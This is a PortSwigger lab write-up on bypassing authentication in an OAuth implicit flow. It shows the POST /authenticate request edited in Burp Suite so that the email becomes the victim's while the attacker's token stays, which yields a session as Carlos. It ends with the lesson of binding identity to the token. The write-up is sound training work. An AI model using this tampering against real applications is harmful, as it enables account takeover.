# OAuth Authentication Bypass via OAuth Implicit Flow

## Lab

**Authentication bypass via OAuth implicit flow**

**Target:** `carlos@carlos-montoya.net`

**Credentials used:** `wiener:peter`

---

## 1. Objective

Log in as the victim user `carlos@carlos-montoya.net` by exploiting an authentication flaw in the OAuth implicit flow.

---

## 2. Vulnerability

The application trusted the `email` and `username` values sent to its `/authenticate` endpoint without properly verifying that they matched the identity represented by the OAuth token.

This allowed an attacker to combine:

* A valid OAuth token belonging to Wiener
* Carlos's email address

The application then created an authenticated session for Carlos.

---

## 3. Normal OAuth Flow

The normal flow was:

```text
Client
  ↓
OAuth Provider
  ↓
User authenticates
  ↓
OAuth token
  ↓
/oauth-callback
  ↓
POST /authenticate
  ↓
Session created
```

The important request was:

```http
POST /authenticate
```

with identity information similar to:

```json
{
  "email": "wiener@hotdog.com",
  "username": "wiener",
  "token": "[OAuth token]"
}
```

---

## 4. Exploitation

### Step 1 — Authenticate normally

Logged in using:

```text
Username: wiener
Password: peter
```

Captured the OAuth authentication flow using Burp Suite.

### Step 2 — Find `/authenticate`

The application sent:

```http
POST /authenticate
```

with Wiener’s email, username, and OAuth token.

### Step 3 — Modify the email

Changed only:

```json
"email": "wiener@hotdog.com"
```

to:

```json
"email": "carlos@carlos-montoya.net"
```

The OAuth token and username were left unchanged.

### Step 4 — Send the modified request

The server returned:

```http
HTTP/2 302 Found
Location: /
Set-Cookie: session=[new session]
```

This showed that the application accepted the modified identity and created a new authenticated session.

### Step 5 — Verify access

Used the newly created session to access the account page.

The account was authenticated as:

```text
Carlos
```

The PortSwigger lab was successfully solved.

---

## 5. Why It Worked

The server should have verified:

```text
OAuth Token → Wiener
```

and then rejected:

```text
OAuth Token = Wiener
Email = Carlos
```

Instead, it effectively trusted the email supplied by the client.

Therefore:

```text
Valid Wiener token
        +
Carlos email
        ↓
Application trusts email
        ↓
Carlos authenticated session
```

---

## 6. Key Lesson

**Never trust user identity information supplied separately from an authentication token.**

The server must verify that the identity claimed by the request matches the identity contained in the trusted OAuth response/token.

### Memory Trick

> **Token = identity proof.**

If the token belongs to Wiener, changing the email to Carlos should never make the server authenticate you as Carlos.

---

## 7. Burp Suite Techniques Used

* Burp Proxy → HTTP History
* OAuth request analysis
* Identifying `/oauth-callback`
* Identifying `POST /authenticate`
* Send to Repeater
* Parameter manipulation
* Session analysis
* Response verification

---

## 8. Result

**Status: SOLVED ✅**

Successfully bypassed authentication and accessed the account as:

```text
carlos@carlos-montoya.net
```
